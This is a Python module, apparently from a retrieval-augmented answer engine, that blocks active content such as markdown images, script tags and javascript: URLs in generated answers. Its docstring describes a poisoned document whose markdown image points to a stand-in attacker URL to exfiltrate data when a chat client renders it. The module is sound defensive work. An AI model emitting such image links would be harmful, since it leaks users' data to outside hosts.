"""Output safety: content in an answer that a client could act on without the reader's consent.

Ported from ContextRAG_Engine ``verification/safety.py`` (ADR-005).

Claim verification proves that a statement follows from the evidence. It cannot make the
evidence safe. A poisoned document can contain a markdown image such as
``![x](https://attacker.example/?d=...)``; an answer that quotes it is faithful to the document,
and a chat client that renders images would fetch the URL, which is a data-exfiltration channel.
So an answer or claim containing active content is refused regardless of its support.
"""

import re
import unicodedata

_ACTIVE = re.compile(
    r"!\[[^\]]*\]\([^)]*\)"
    r"|<\s*(?:img|script|iframe|object|embed|link|meta|svg|form|style)\b"
    r"|javascript\s*:|vbscript\s*:|data\s*:\s*text/html",
    re.IGNORECASE,
)
_CONTROL = re.compile(r"[\x00-\x1f\x7f]+")
_UNSAFE_ATTR = re.compile(r"[<>\"&]")
MAX_SOURCE_CHARS = 200


def has_active_content(text: str) -> bool:
    """True when ``text`` carries markdown images, scriptable tags or active URL schemes."""
    return bool(_ACTIVE.search(text))


def strip_invisible(value: str) -> str:
    """Replace control, line/paragraph separator and format (zero-width/bidi) chars with spaces."""
    return "".join(
        " " if unicodedata.category(ch) in ("Cc", "Cf", "Zl", "Zp") else ch for ch in value
    )


def safe_attribute(value: str, limit: int = MAX_SOURCE_CHARS) -> str:
    """Reduce a source/document name so it cannot close an XML attribute or carry markup."""
    cleaned = _UNSAFE_ATTR.sub("'", _CONTROL.sub(" ", strip_invisible(value))).strip()
    if len(cleaned) > limit:
        return cleaned[:limit] + "..."
    return cleaned
